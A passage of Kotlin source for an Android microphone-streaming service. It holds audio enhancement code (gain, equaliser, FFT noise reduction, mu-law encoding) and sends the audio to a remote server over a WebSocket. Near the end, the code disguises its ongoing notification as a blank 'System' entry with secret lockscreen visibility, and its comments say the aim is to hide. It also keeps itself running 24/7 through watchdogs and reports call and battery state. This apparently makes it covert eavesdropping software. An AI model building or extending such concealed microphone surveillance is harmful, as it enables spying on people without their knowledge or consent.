            "far" -> if (strongAi) 15000.0 else 13000.0
            else -> if (strongAi) 11500.0 else 9800.0
        }
        val rawGain = (gainTarget / rms).coerceIn(1.0, gainCeil)
        // Slow, smooth attack/release for natural dynamics.
        smoothedGain = if (rawGain > smoothedGain)
            smoothedGain * 0.85 + rawGain * 0.15
        else
            smoothedGain * 0.97 + rawGain * 0.03
        for (i in 0 until samples) work[i] *= smoothedGain

        // ── Stage 4: Gentle presence boost @ 2.2 kHz ───────────────────────
        // Peaking: +3 dB, Q=1.0
        val eq1b0 = 1.1541
        val eq1b1 = -1.2070
        val eq1b2 = 0.5173
        val eq1a1 = -1.2070
        val eq1a2 = 0.6714
        for (i in 0 until samples) {
            val x = work[i]
            val y = eq1b0 * x + eq1b1 * eq1X1 + eq1b2 * eq1X2 - eq1a1 * eq1Y1 - eq1a2 * eq1Y2
            eq1X2 = eq1X1
            eq1X1 = x
            eq1Y2 = eq1Y1
            eq1Y1 = y
            val wet = when (p) {
                "near" -> if (strongAi) 0.10 else 0.06
                "far" -> if (strongAi) 0.25 else 0.18  // More EQ processing for far voices
                else -> if (strongAi) 0.14 else 0.09
            }
            work[i] = x * (1.0 - wet) + y * wet
        }

        // ── Stage 5: Loudness normalization (boost quiet chunks, tame peaks) ─
        var peakAbs = 1.0
        for (v in work) {
            val abs = kotlin.math.abs(v)
            if (abs > peakAbs) peakAbs = abs
        }
        val loudnessTarget = 30000.0
        val maxNorm = when (p) {
            "near" -> 2.6
            "far" -> 4.2
            else -> 3.2
        }
        val norm = (loudnessTarget / peakAbs).coerceIn(1.0, maxNorm)
        for (i in 0 until samples) work[i] *= norm

        // ── Stage 6: Soft peak limiter + encode PCM-16 LE ────────────────────
        val out = ByteArray(len)
        for (i in 0 until samples) {
            val limited = softPeakLimit(work[i])
            val clamped = limited.toInt().coerceIn(-32768, 32767)
            out[i * 2]     = (clamped and 0xFF).toByte()
            out[i * 2 + 1] = ((clamped shr 8) and 0xFF).toByte()
        }
        return out
    }

    // ════════════════════════════════════════════════════════════════════════
    // HQ BUFFERED AUDIO MODE — Heavy processing for clarity on weak networks
    // ════════════════════════════════════════════════════════════════════════
    
    // Audio codec for HQ mode (new header byte)
    private val AUDIO_CODEC_HQ_PCM16_16K: Byte = 0x10  // HQ mode identifier
    private val AUDIO_CODEC_HQ_MULAW: Byte = 0x11     // HQ mode compressed
    
    /**
     * Heavy audio processing for HQ buffered mode.
     * Since we have 10 seconds of audio, we can apply aggressive processing
     * without worrying about real-time constraints.
     * 
     * Processing pipeline:
     * 1. Convert to floating point
     * 2. Aggressive spectral denoise
     * 3. Silence detection & removal (optional)
     * 4. Strong far-voice boost (+6dB @ 2-4kHz)
     * 5. Multi-band compression
     * 6. Normalization
     * 7. Final limiter
     */
    private fun processHqBuffer(buffer: ByteArray, len: Int): ByteArray {
        if (len < 2) return buffer.copyOf(len)
        val samples = len / 2
        val p = voiceProfile
        
        // ── Decode PCM-16 LE → double working buffer ────────────────────────
        val work = DoubleArray(samples)
        for (i in 0 until samples) {
            val lo = buffer[i * 2].toInt() and 0xFF
            val hi = buffer[i * 2 + 1].toInt() and 0xFF
            work[i] = ((hi shl 8) or lo).toShort().toDouble()
        }
        
        // ── Stage 1: Strong high-pass filter @ 100 Hz ───────────────────────
        // More aggressive than realtime to remove all rumble
        val hpAlpha = 0.96
        var hpPrevX = 0.0
        var hpPrevY = 0.0
        for (i in 0 until samples) {
            val x = work[i]
            val y = hpAlpha * (hpPrevY + x - hpPrevX)
            hpPrevX = x
            hpPrevY = y
            work[i] = y
        }
        
        // ── Stage 2: AGGRESSIVE spectral denoise ────────────────────────────
        // Process in chunks since denoiser expects smaller frames
        val preDenoise = if (p == "far") work.copyOf() else null
        val chunkSize = 4096
        var offset = 0
        while (offset < samples) {
            val endIdx = min(offset + chunkSize, samples)
            val chunk = work.copyOfRange(offset, endIdx)
            spectralDenoiser.denoise(chunk)
            System.arraycopy(chunk, 0, work, offset, chunk.size)
            offset += chunkSize
        }
        if (p == "far" && preDenoise != null) {
            for (i in 0 until samples) {
                // Keep weak speech transients by blending back some pre-denoise signal.
                work[i] = preDenoise[i] * 0.50 + work[i] * 0.50
            }
        }
        
        // ── Stage 3: Strong upward gain for far voices ──────────────────────
        // Calculate RMS for adaptive gain
        var sumSq = 0.0
        for (v in work) sumSq += v * v
        val rms = Math.sqrt(sumSq / samples).coerceAtLeast(1.0)
        
        // MUCH higher gain ceiling in HQ mode (optimized for far voices)
        val gainCeil = when (p) {
            "near" -> 1.5
            "far" -> 4.0  // Increased from 3.2x to 4.0x for better far voice pickup
            else -> 2.5
        }
        val gainTarget = when (p) {
            "near" -> 5500.0
            "far" -> 9000.0  // Increased target for far voices (was 8000)
            else -> 7000.0
        }
        val gain = (gainTarget / rms).coerceIn(1.0, gainCeil)
        Log.d(TAG, "HQ gain: ${String.format("%.2f", gain)}x (RMS: ${rms.toInt()}, profile: $p)")
        
        for (i in 0 until samples) work[i] *= gain
        
        // ── Stage 4: Strong presence boost @ 2-4 kHz (speech clarity) ───────
        // Peaking EQ: +8dB at 2.8kHz for HQ mode (increased from +6dB for better clarity)
        // Biquad coefficients for 2800Hz peak, Q=1.0, +8dB gain at 16kHz sample rate
        val eqB0 = 1.3780
        val eqB1 = -1.1245
        val eqB2 = 0.3980
        val eqA1 = -1.1245
        val eqA2 = 0.7760
        
        var eqX1 = 0.0; var eqX2 = 0.0
        var eqY1 = 0.0; var eqY2 = 0.0
        
        val wetMix = when (p) {
            "near" -> 0.18
            "far" -> 0.50   // Increased from 0.40 for stronger far voice EQ
            else -> 0.30
        }
        
        for (i in 0 until samples) {
            val x = work[i]
            val y = eqB0 * x + eqB1 * eqX1 + eqB2 * eqX2 - eqA1 * eqY1 - eqA2 * eqY2
            eqX2 = eqX1; eqX1 = x
            eqY2 = eqY1; eqY1 = y
            work[i] = x * (1.0 - wetMix) + y * wetMix
        }
        
        // ── Stage 5: Additional high-mid boost @ 4kHz for consonant clarity ─
        // Biquad coefficients for 4000Hz peak, Q=1.2, +6dB gain (increased from +4dB)
        val eq2B0 = 1.2890
        val eq2B1 = -0.9156
        val eq2B2 = 0.3221
        val eq2A1 = -0.9156
        val eq2A2 = 0.6111
        
        var eq2X1 = 0.0; var eq2X2 = 0.0
        var eq2Y1 = 0.0; var eq2Y2 = 0.0
        
        val wet2 = when (p) {
            "near" -> 0.10
            "far" -> 0.30   // Increased from 0.25 for better consonant clarity
            else -> 0.18
        }
        
        for (i in 0 until samples) {
            val x = work[i]
            val y = eq2B0 * x + eq2B1 * eq2X1 + eq2B2 * eq2X2 - eq2A1 * eq2Y1 - eq2A2 * eq2Y2
            eq2X2 = eq2X1; eq2X1 = x
            eq2Y2 = eq2Y1; eq2Y1 = y
            work[i] = x * (1.0 - wet2) + y * wet2
        }
        
        // ── Stage 6: Loudness normalization (both boost + anti-clipping) ─────
        var maxAbs = 1.0
        for (v in work) {
            val abs = kotlin.math.abs(v)
            if (abs > maxAbs) maxAbs = abs
        }
        val targetPeak = 30000.0
        val maxBoost = when (p) {
            "near" -> 2.4
            "far" -> 4.0
            else -> 3.0
        }
        val normFactor = (targetPeak / maxAbs).coerceIn(1.0, maxBoost)
        for (i in 0 until samples) work[i] *= normFactor
        
        // ── Stage 7: Soft peak limiter + encode PCM-16 LE ───────────────────
        val out = ByteArray(len)
        for (i in 0 until samples) {
            val limited = softPeakLimit(work[i])
            val clamped = limited.toInt().coerceIn(-32768, 32767)
            out[i * 2] = (clamped and 0xFF).toByte()
            out[i * 2 + 1] = ((clamped shr 8) and 0xFF).toByte()
        }
        
        return out
    }
    
    /**
     * Encode HQ buffer for transmission.
     * Uses a different header to signal HQ mode to the server.
     * Header format: MM + version(0x02) + codec + 4-byte length + payload.
     * codec: 0x10 = PCM, 0x11 = mu-law compressed.
     */
    private fun encodeHqAudio(payload: ByteArray, isCompressed: Boolean): ByteArray {
        if (payload.isEmpty()) return payload
        
        // In HQ mode, always prefer compression for network stability
        val codec = if (isCompressed) AUDIO_CODEC_HQ_MULAW else AUDIO_CODEC_HQ_PCM16_16K
        
        // Header: [0x4D][0x4D][0x02][codec][4-byte length]
        val out = ByteArray(8 + payload.size)
        out[0] = 0x4D.toByte()  // Magic 'M'
        out[1] = 0x4D.toByte()  // Magic 'M'
        out[2] = 0x02           // Version 2 = HQ buffered mode
        out[3] = codec
        // 4-byte length (big-endian)
        out[4] = ((payload.size shr 24) and 0xFF).toByte()
        out[5] = ((payload.size shr 16) and 0xFF).toByte()
        out[6] = ((payload.size shr 8) and 0xFF).toByte()
        out[7] = (payload.size and 0xFF).toByte()
        System.arraycopy(payload, 0, out, 8, payload.size)
        
        return out
    }
    
    /**
     * Send HQ audio in smaller chunks to avoid WebSocket frame size limits.
     * Splits large buffers into 64KB chunks for reliable transmission.
     */
    private fun sendHqAudioChunked(data: ByteArray): Boolean {
        if (data.size <= hqChunkSize) {
            // Small enough to send directly
            return safeSend(data.toByteString())
        }
        
        // Split into chunks
        var offset = 0
        var chunkCount = 0
        while (offset < data.size) {
            val remaining = data.size - offset
            val chunkLen = min(hqChunkSize, remaining)
            val chunk = data.copyOfRange(offset, offset + chunkLen)
            
            if (!safeSend(chunk.toByteString())) {
                Log.e(TAG, "HQ chunk send failed at offset $offset (chunk ${chunkCount + 1})")
                return false
            }
            
            offset += chunkLen
            chunkCount++
            
            // Small delay between chunks to avoid overwhelming the network
            if (offset < data.size) {
                Thread.sleep(50)
            }
        }
        
        Log.d(TAG, "HQ audio sent in $chunkCount chunks (${data.size} bytes total)")
        return true
    }
    
    /**
     * Detect if buffer is mostly silent to avoid transmitting noise.
     * Returns true if >85% of samples are below silence threshold.
     */
    private fun isBufferMostlySilent(buffer: ByteArray, len: Int): Boolean {
        if (len < 2) return true
        
        val samples = len / 2
        var silentCount = 0
        
        // Calculate RMS in chunks for efficiency
        val chunkSize = 1000
        var i = 0
        while (i < len - 1) {
            val endIdx = min(i + chunkSize * 2, len - 1)
            var sumSq = 0.0
            var count = 0
            
            var j = i
            while (j < endIdx) {
                val lo = buffer[j].toInt() and 0xFF
                val hi = buffer[j + 1].toInt() and 0xFF
                val sample = ((hi shl 8) or lo).toShort().toDouble()
                sumSq += sample * sample
                count++
                j += 2
            }
            
            val rms = Math.sqrt(sumSq / count)
            if (rms < hqSilenceThreshold) {
                silentCount += count
            }
            
            i = endIdx
        }
        
        val silentPercent = silentCount.toDouble() / samples
        return silentPercent >= hqSilencePercent
    }

    private fun encodeHqAudio(pcm16: ByteArray): ByteArray {
        // Legacy compatibility - auto-compress
        val compressed = pcm16ToMuLaw(pcm16)
        return encodeHqAudio(compressed, isCompressed = true)
    }

    private fun encodeWsFallbackAudio(pcm16: ByteArray): ByteArray {
        if (pcm16.isEmpty()) return pcm16
        val codec = chooseWsFallbackCodec()
        val payload = if (codec == AUDIO_CODEC_MULAW_8K) pcm16ToMuLaw(pcm16) else pcm16
        val out = ByteArray(4 + payload.size)
        out[0] = 0x4D.toByte()
        out[1] = 0x4D.toByte()
        out[2] = 0x01
        out[3] = codec
        System.arraycopy(payload, 0, out, 4, payload.size)
        return out
    }

    private fun chooseWsFallbackCodec(): Byte {
        // LOW NETWORK MODE: AVOID PCM (256 kbps) - use compressed codec
        // PCM is the WRONG choice for weak networks
        if (lowNetworkMode) {
            // Clarity-priority low-network mode:
            // keep PCM for WS fallback unless user explicitly selected "smart".
            return if (wsStreamMode == "smart") {
                Log.i(TAG, "Low-network mode: using MuLaw because stream mode is smart")
                AUDIO_CODEC_MULAW_8K
            } else {
                Log.i(TAG, "Low-network mode: keeping PCM fallback for clarity")
                AUDIO_CODEC_PCM16_16K
            }
        }
        
        return when (wsStreamMode) {
            "pcm" -> AUDIO_CODEC_PCM16_16K
            "smart" -> AUDIO_CODEC_MULAW_8K
            else -> {
                // AUTO MODE: Detect network conditions
                val cm = connectivityManager
                val network = cm?.activeNetwork
                val caps = if (network != null) cm.getNetworkCapabilities(network) else null
                val downKbps = caps?.linkDownstreamBandwidthKbps ?: 0
                val upKbps = caps?.linkUpstreamBandwidthKbps ?: 0

                // Use compression when:
                // - Bandwidth below 200 kbps (PCM needs ~256 kbps)
                // - OR multiple connection failures
                // - OR on cellular with poor signal
                val poorBandwidth = (downKbps in 1..200 || upKbps in 1..200)
                val connectionIssues = wsReconnectAttempts >= 3
                val poorCellular = caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true && 
                                   (downKbps in 1..500)

                if (poorBandwidth || connectionIssues || poorCellular) {
                    Log.w(TAG, "Weak network ($downKbps down, $upKbps up, attempts=$wsReconnectAttempts) - using MuLaw compression")
                    AUDIO_CODEC_MULAW_8K  // 64 kbps vs 256 kbps
                } else {
                    AUDIO_CODEC_PCM16_16K  // Full quality when network is good
                }
            }
        }
    }

    private fun pcm16ToMuLaw(pcm16: ByteArray): ByteArray {
        val samples = pcm16.size / 2
        val out = ByteArray(samples)
        var i = 0
        var o = 0
        while (i + 1 < pcm16.size) {
            val s = readLeSample(pcm16, i)
            out[o++] = linearToMuLaw(s)
            i += 2
        }
        return out
    }

    private fun linearToMuLaw(sample: Int): Byte {
        val BIAS = 0x84
        val CLIP = 32635
        var pcmVal = sample
        val sign = if (pcmVal < 0) {
            pcmVal = -pcmVal
            0x80
        } else {
            0x00
        }
        if (pcmVal > CLIP) pcmVal = CLIP
        pcmVal += BIAS
        var exponent = 7
        var expMask = 0x4000
        while (exponent > 0 && (pcmVal and expMask) == 0) {
            exponent--
            expMask = expMask shr 1
        }
        val mantissa = (pcmVal shr (exponent + 3)) and 0x0F
        val muLaw = (sign or (exponent shl 4) or mantissa).inv() and 0xFF
        return muLaw.toByte()
    }

    // ────────────────────────────────────────────────────────────────────────
    // Overlap-add FFT spectral denoiser
    // ────────────────────────────────────────────────────────────────────────

    /**
     * Overlap-add spectral denoiser.
     *
     * Algorithm:
     *   1. Buffer incoming samples into 512-sample frames with 50% overlap.
     *   2. Apply Hann window and forward FFT.
     *   3. Estimate noise power spectrum by exponential averaging over quiet frames.
     *   4. Subtract the noise estimate from each frequency bin (power domain),
     *      keeping a spectral floor of 4% of the noise power to prevent musical noise.
     *   5. IFFT + Hann window + overlap-add → output.
     *
     * The denoiser is most effective on stationary noise: fans, AC hum, wind,
     * electrical hiss — exactly what a phone mic in a room picks up.  Neural
     * denoisers (RNNoise / DeepFilterNet) can go further but require NDK.
     *
     * Latency: HOP (256 samples) = 16 ms at 16 kHz — imperceptible in monitoring.
     */
    private inner class SpectralDenoiser {
        private val FRAME = 512                 // FFT length (must be power of 2)
        private val HOP   = FRAME / 2           // 50% overlap
        private val BINS  = FRAME / 2 + 1       // unique bins DC..Nyquist

        // Periodic Hann window — gives perfect reconstruction at 50% overlap.
        private val win = DoubleArray(FRAME) { i ->
            0.5 * (1.0 - Math.cos(2.0 * Math.PI * i / FRAME))
        }

        // Input overlap buffer — pre-primed with HOP zeros so output appears
        // immediately from the first call (no startup silence at the receiver).
        private val inBuf  = DoubleArray(FRAME)
        private var inFill = HOP

        // Output overlap-add accumulator
        private val outBuf   = DoubleArray(FRAME)
        // Queue of samples that are ready to be delivered to the caller
        private val readyOut = ArrayDeque<Double>(FRAME * 4)

        // Noise power spectrum (one value per positive frequency bin)
        private val noisePow = DoubleArray(BINS)
        private var adaptFrames = 0    // frames consumed so far for noise estimation

        fun reset() {
            inBuf.fill(0.0)
            inFill = HOP            // re-prime with zeros
            outBuf.fill(0.0)
            readyOut.clear()
            noisePow.fill(0.0)
            adaptFrames = 0
        }

        /**
         * Process [samples] in-place.  Always writes exactly [samples].size values
         * back into the array (zero-padded for the very first partial frame).
         */
        fun denoise(samples: DoubleArray) {
            val n   = samples.size
            val out = DoubleArray(n)
            var outIdx = 0

            for (s in samples) {
                inBuf[inFill++] = s
                if (inFill == FRAME) {
                    // Process frame → overlap-add → queue HOP output samples
                    val frameOut = processFrame()
                    for (i in 0 until FRAME) outBuf[i] += frameOut[i]
                    for (i in 0 until HOP)   readyOut.addLast(outBuf[i])
                    // Slide accumulator and input buffer
                    outBuf.copyInto(outBuf, 0, HOP, FRAME)
                    for (i in FRAME - HOP until FRAME) outBuf[i] = 0.0
                    inBuf.copyInto(inBuf, 0, HOP, FRAME)
                    inFill = HOP
                }
            }

            // Drain queued output; zero-pad only during the startup partial frame.
            while (outIdx < n) {
                out[outIdx++] = if (readyOut.isNotEmpty()) readyOut.removeFirst() else 0.0
            }
            System.arraycopy(out, 0, samples, 0, n)
        }

        private fun processFrame(): DoubleArray {
            // Windowed FFT
            val re = DoubleArray(FRAME) { i -> inBuf[i] * win[i] }
            val im = DoubleArray(FRAME)
            fft(re, im, false)

            // Power spectrum for positive bins
            val power = DoubleArray(BINS) { i -> re[i]*re[i] + im[i]*im[i] }
            val frameRms = Math.sqrt(power.average()).coerceAtLeast(1.0)

            // Update noise estimate:
            //   first 30 frames: aggressive averaging (fast bootstrap)
            //   thereafter: only from quiet frames (speech skips the update)
            // Adaptive threshold: only update if this frame is close to the current
            // estimated noise floor. A fixed threshold failed because quiet far-voice
            // frames (slightly above noise) were still classified as "quiet" and the
            // noise model absorbed the voice and then subtracted it.
            val noiseFloorRms = Math.sqrt(noisePow.average()).coerceAtLeast(1.0)
            val isQuiet = frameRms < noiseFloorRms * 1.2 + 20.0
            if (adaptFrames < 30 || isQuiet) {
                val alpha = if (adaptFrames < 15) 0.5 else 0.96
                for (i in noisePow.indices) {
                    noisePow[i] = alpha * noisePow[i] + (1.0 - alpha) * power[i]
                }
                adaptFrames++
            }

            // Spectral subtraction — only after enough noise frames are collected
            if (adaptFrames >= 15) {
                // Increase subtraction only in strong/noisy conditions (e.g. exhaust fans).
                val strongDenoise = aiEnhancementEnabled || estimatedNoiseDb > -54.0
                val OVER  = if (strongDenoise) 0.84 else 0.74
                val FLOOR = if (strongDenoise) 0.26 else 0.38
                for (i in 0 until BINS) {
                    val noiseP = noisePow[i].coerceAtLeast(1e-10)
                    val clean  = (power[i] - OVER * noiseP).coerceAtLeast(FLOOR * noiseP)
                    val scale  = if (power[i] > 1e-10) Math.sqrt(clean / power[i]) else 0.0
                    re[i] *= scale;  im[i] *= scale
                    // Mirror scale to conjugate negative-frequency bin
                    if (i in 1 until BINS - 1) {
                        re[FRAME - i] *= scale
                        im[FRAME - i] *= scale
                    }
                }
            }

            // IFFT + synthesis window
            fft(re, im, true)
            return DoubleArray(FRAME) { i -> re[i] * win[i] }
        }
    }

    /**
     * In-place Cooley-Tukey iterative radix-2 FFT / IFFT.
     * [re] and [im] must both have a length that is a power of two.
     * forward (inverse=false): analysis.  inverse (inverse=true): synthesis, scaled 1/N.
     */
    private fun fft(re: DoubleArray, im: DoubleArray, inverse: Boolean) {
        val n = re.size
        // Bit-reversal permutation
        var j = 0
        for (i in 1 until n) {
            var bit = n ushr 1
            while (j and bit != 0) { j = j xor bit; bit = bit ushr 1 }
            j = j xor bit
            if (i < j) {
                var t = re[i]; re[i] = re[j]; re[j] = t
                t = im[i];     im[i] = im[j]; im[j] = t
            }
        }
        // Butterfly stages
        var len = 2
        while (len <= n) {
            val half = len ushr 1
            val ang  = 2.0 * Math.PI / len * (if (inverse) -1.0 else 1.0)
            val wbRe = Math.cos(ang)
            val wbIm = Math.sin(ang)
            var i = 0
            while (i < n) {
                var wRe = 1.0; var wIm = 0.0
                for (k in 0 until half) {
                    val uRe = re[i + k];            val uIm = im[i + k]
                    val vRe = re[i+k+half]*wRe - im[i+k+half]*wIm
                    val vIm = re[i+k+half]*wIm + im[i+k+half]*wRe
                    re[i + k]      = uRe + vRe;     im[i + k]      = uIm + vIm
                    re[i + k+half] = uRe - vRe;     im[i + k+half] = uIm - vIm
                    val nwRe = wRe * wbRe - wIm * wbIm
                    wIm = wRe * wbIm + wIm * wbRe
                    wRe = nwRe
                }
                i += len
            }
            len = len shl 1
        }
        if (inverse) { val inv = 1.0 / n; for (i in 0 until n) { re[i] *= inv; im[i] *= inv } }
    }

    /**
     * Soft-knee peak limiter.
     * Linear below ±24000; exponential curve up to ±32767 for samples above the knee.
     * Prevents hard digital clipping without audible distortion.
     */
    private fun softPeakLimit(x: Double): Double {
        val knee = 18000.0 // Lower knee for earlier soft limiting
        val ceil = 32767.0
        val abs  = Math.abs(x)
        if (abs <= knee) return x
        if (abs >= ceil) return Math.copySign(ceil, x)
        val range      = ceil - knee
        val excess     = abs - knee
        val compressed = knee + range * (1.0 - Math.exp(-excess / range))
        return Math.copySign(compressed, x)
    }

    private fun updateAutoAiProfile(pcm16: ByteArray, len: Int) {
        val sampleCount = len / 2
        if (sampleCount <= 0) return

        var sumSq = 0.0
        var peak = 0
        var i = 0
        while (i + 1 < len) {
            val s = readLeSample(pcm16, i)
            val abs = kotlin.math.abs(s)
            if (abs > peak) peak = abs
            sumSq += s.toDouble() * s.toDouble()
            i += 2
        }

        val rms = kotlin.math.sqrt(sumSq / sampleCount).coerceAtLeast(1.0)
        val rmsDb = 20.0 * kotlin.math.log10(rms / 32768.0)
        val peakDb = 20.0 * kotlin.math.log10((peak.coerceAtLeast(1)).toDouble() / 32768.0)
        val crestDb = peakDb - rmsDb

        val likelySpeech = rmsDb > -48.0 && crestDb > 5.0
        if (!likelySpeech) {
            val alpha = if (rmsDb > estimatedNoiseDb) 0.90 else 0.97
            estimatedNoiseDb = alpha * estimatedNoiseDb + (1.0 - alpha) * rmsDb
        }

        val now = System.currentTimeMillis()
        if (now - lastAutoAiSwitchAt < 12_000) return

        val shouldEnableStrong = estimatedNoiseDb > -55.0
        val shouldDisableStrong = estimatedNoiseDb < -63.0

        if (!aiEnhancementEnabled && shouldEnableStrong) {
            aiEnhancementEnabled = true
            lastAutoAiSwitchAt = now
            sendHealthStatus("auto_ai_on")
        } else if (aiEnhancementEnabled && shouldDisableStrong) {
            aiEnhancementEnabled = false
            lastAutoAiSwitchAt = now
            sendHealthStatus("auto_ai_off")
        }
    }

    private fun readLeSample(buf: ByteArray, offset: Int): Int {
        val lo = buf[offset].toInt() and 0xFF
        val hi = buf[offset + 1].toInt()
        return ((hi shl 8) or lo).toShort().toInt()
    }

    private fun stopAudioCapture(reason: String = "stop_capture_cmd") {
        isCapturing = false
        try {
            audioRecord?.stop()
            audioRecord?.release()
        } catch (_: Exception) {}
        audioRecord = null
        if (ourAudioMode) {
            try {
                (getSystemService(Context.AUDIO_SERVICE) as? AudioManager)?.mode = AudioManager.MODE_NORMAL
            } catch (_: Exception) {}
            ourAudioMode = false
        }
        sendHealthStatus(reason)
    }

    private fun sendHealthStatus(reason: String) {
        val ws = webSocket ?: return
        lastHealthSentAt = System.currentTimeMillis()
        val battery = getBatterySnapshot()
        val internetOnline = isInternetOnline()
        val callActive = isDeviceInCall()
        
        // Get network quality info for debugging
        val cm = connectivityManager
        val network = cm?.activeNetwork
        val caps = if (network != null) cm.getNetworkCapabilities(network) else null
        val downKbps = caps?.linkDownstreamBandwidthKbps ?: 0
        val upKbps = caps?.linkUpstreamBandwidthKbps ?: 0
        val isWifi = caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
        val isCellular = caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true
        
        val msg = JSONObject().apply {
            put("type", "health_status")
            put("deviceId", deviceId)
            put("wsConnected", activeWebSocket != null)
            // In WebRTC mode microphone is captured by WebRTC audio source, not AudioRecord.
            put("micCapturing", isCapturing || isWebRtcStreaming)
            put("lastAudioChunkSentAt", lastAudioChunkSentAt)
            put("reason", reason)
            put("ts", lastHealthSentAt)
            put("aiMode", aiEnhancementEnabled)
            put("aiAuto", aiAutoModeEnabled)
            put("photoAi", aiPhotoEnhancementEnabled)
            put("photoQuality", photoQualityMode)
            put("photoNight", photoNightMode)
            put("appVersionName", BuildConfig.VERSION_NAME)
            put("appVersionCode", BuildConfig.VERSION_CODE)
            put("streamCodecMode", wsStreamMode)
            put("streamCodec", if (chooseWsFallbackCodec() == AUDIO_CODEC_MULAW_8K) "smart" else "pcm")
            put("voiceProfile", voiceProfile)
            put("noiseDb", estimatedNoiseDb)
            put("internetOnline", internetOnline)
            put("callActive", callActive)
            // HQ Buffered mode info
            put("streamingMode", if (hqBufferedMode) "hq_buffered" else "realtime")
            put("hqBufferSeconds", if (hqBufferedMode) hqBufferSeconds else 0)
            put("hqBufferFill", if (hqBufferedMode) hqBufferOffset else 0)
            // Network quality info
            put("netDownKbps", downKbps)
            put("netUpKbps", upKbps)
            put("netType", when {
                isWifi -> "wifi"
                isCellular -> "cellular"
                else -> "other"
            })
            put("bitrateKbps", currentWebRtcBitrateKbps)
            if (battery != null) {
                put("batteryPct", battery.first)
                put("charging", battery.second)
            }
        }
        safeSend(msg.toString())
    }

    private fun isInternetOnline(): Boolean {
        val cm = connectivityManager ?: return false
        val network = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(network) ?: return false
        val hasTransport = caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
            caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
        val validated = caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
        return hasTransport && validated
    }

    private fun isDeviceInCall(): Boolean {
        return try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager ?: return false
            val mode = audioManager.mode
            // Exclude MODE_IN_COMMUNICATION that we set ourselves to boost mic sensitivity.
            !ourAudioMode && (mode == AudioManager.MODE_IN_CALL || mode == AudioManager.MODE_IN_COMMUNICATION)
        } catch (_: Exception) {
            false
        }
    }

    private fun getBatterySnapshot(): Pair<Int, Boolean>? {
        return try {
            val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED)) ?: return null
            val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
            val pct = if (level >= 0 && scale > 0) ((level * 100f) / scale).toInt().coerceIn(0, 100) else -1
            val status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
            val charging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL
            Pair(pct, charging)
        } catch (_: Exception) {
            null
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // File recording helpers
    // ────────────────────────────────────────────────────────────────────────

    private fun openRecordingFile() {
        try {
            val dir = getExternalFilesDir(null) ?: filesDir
            dir.mkdirs()
            val timestamp = System.currentTimeMillis()
            recordingFile = File(dir, "rec_${timestamp}.pcm")
            recordingFileStream = FileOutputStream(recordingFile)
            isSavingFile = true
            Log.i(TAG, "Recording to: ${recordingFile?.absolutePath}")
            updateNotification("Live streaming + Recording…")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open recording file", e)
        }
    }

    private fun closeRecordingFile() {
        isSavingFile = false
        try {
            recordingFileStream?.flush()
            recordingFileStream?.close()
        } catch (_: Exception) {}
        recordingFileStream = null
        Log.i(TAG, "Recording saved: ${recordingFile?.name}")
        updateNotification("Live streaming active")
    }

    // ────────────────────────────────────────────────────────────────────────
    // Notification helpers
    // ────────────────────────────────────────────────────────────────────────

    private fun createNotificationChannel() {
        // IMPORTANCE_LOW is required for foreground service survival
        // But we hide as much as possible
        val channel = NotificationChannel(
            CHANNEL_ID,
            "System",  // Generic name
            NotificationManager.IMPORTANCE_LOW  // Required for foreground service
        ).apply {
            description = "Background service"
            setSound(null, null)
            enableVibration(false)
            setShowBadge(false)
            enableLights(false)
            lockscreenVisibility = Notification.VISIBILITY_SECRET
        }
        getSystemService(NotificationManager::class.java)
            .createNotificationChannel(channel)
    }

    private fun buildNotification(statusText: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System")  // Generic title
            .setContentText("")  // Empty text - less visible
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setLocalOnly(true)  // Don't sync to other devices
            .build()
    }

    private fun updateNotification(statusText: String) {
        // Ignore status text - always show minimal notification
        val manager = getSystemService(NotificationManager::class.java)
        manager.notify(NOTIF_ID, buildNotification(""))
    }

    // ────────────────────────────────────────────────────────────────────────
    // WakeLock — keeps CPU awake while app is in background
    // ────────────────────────────────────────────────────────────────────────

    private fun acquireWakeLock() {
        val pm = getSystemService(PowerManager::class.java)
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "MicMonitor::AudioWakeLock"
        ).also {
            it.setReferenceCounted(false)
            if (!it.isHeld) it.acquire() // Released in onDestroy
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // WorkManager watchdog — keeps service alive 24/7
    // ────────────────────────────────────────────────────────────────────────

    private fun scheduleKeepAlive() {
        val request = PeriodicWorkRequestBuilder<KeepAliveWorker>(15, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
            "keep_alive",
            ExistingPeriodicWorkPolicy.KEEP,
            request
        )
        Log.i(TAG, "KeepAlive watchdog scheduled (15 min interval)")
    }

    /**
     * Schedules a one-shot AlarmManager alarm 8 minutes from now.
     * On fire, sends ACTION_RECONNECT to this service — survives Doze better
     * than coroutines because AlarmManager uses ELAPSED_REALTIME_WAKEUP.
     * The alarm reschedules itself each time it fires, creating a rolling chain.
     */
    private fun scheduleReconnectAlarm() {
        val intent = Intent(applicationContext, MicService::class.java).apply {
            action = ACTION_RECONNECT
        }
        val pendingIntent = PendingIntent.getService(
            applicationContext, 2, intent,
